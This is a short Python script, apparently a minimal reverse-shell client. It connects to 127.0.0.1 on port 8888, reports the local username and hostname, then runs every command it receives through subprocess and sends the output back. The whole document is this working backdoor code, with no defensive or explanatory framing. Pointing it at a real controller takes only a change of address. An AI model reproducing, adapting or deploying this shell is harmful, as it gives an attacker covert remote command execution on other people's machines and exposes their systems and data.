import socket
import subprocess
from getpass import getuser

userName, hostName = getuser(), socket.gethostname()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 8888))

sock.send("{user}@{host}".format(user = userName, host = hostName).encode())

while True:
    command = sock.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    sock.send(output.encode())

sock.close()
